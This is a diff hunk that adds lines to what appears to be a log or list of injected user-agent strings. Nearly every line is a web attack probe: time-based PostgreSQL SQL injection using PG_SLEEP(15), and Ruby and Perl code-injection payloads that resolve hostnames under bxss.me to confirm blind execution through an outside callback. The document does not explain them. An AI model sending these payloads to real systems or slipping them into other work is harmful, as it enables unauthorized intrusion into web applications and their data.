@@ -1466,3 +1466,8 @@ geth(ostbyname(lc('hitwa'.'evirqpjm5a6fe.bxss.me.')).'A'.chr(67).chr(hex('58')).
 Mozilla/5.0 (Windows NT 10.0; Win64; x64 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36KzyeM3CC')) OR 561=(SELECT 561 FROM PG_SLEEP(15))--)
 Mozilla/5.0 (Windows NT 10.0; Win64; x64 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36FAEGpfK0') OR 376=(SELECT 376 FROM PG_SLEEP(15))--)
 Mozilla/5.0 (Windows NT 10.0; Win64; x64 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36knFSDj9v' OR 225=(SELECT 225 FROM PG_SLEEP(15))--)
+Mozilla/5.0 (Windows NT 10.0; Win64; x64 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36BqcNd3Y4')) OR 105=(SELECT 105 FROM PG_SLEEP(15))--)
+""+""A"".concat(70-3.concat(22*4).concat(111).concat(83).concat(110).concat(87)+(require""socket"" Socket.gethostbyname(""hitop""+""flyatuwu731e8.bxss.me."")[3].to_s)+"")
+'+'A'.concat(70-3.concat(22*4).concat(105).concat(88).concat(101).concat(84)+(require'socket' Socket.gethostbyname('hitmq'+'whteacpv9c3c2.bxss.me.')[3].to_s)+')
+Mozilla/5.0 (Windows NT 10.0; Win64; x64 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36z3ZHCaKT') OR 969=(SELECT 969 FROM PG_SLEEP(15))--)
+'A'.concat(70-3.concat(22*4).concat(115).concat(74).concat(114).concat(68)+(require'socket' Socket.gethostbyname('hitue'+'esaymost62d8a.bxss.me.')[3].to_s))
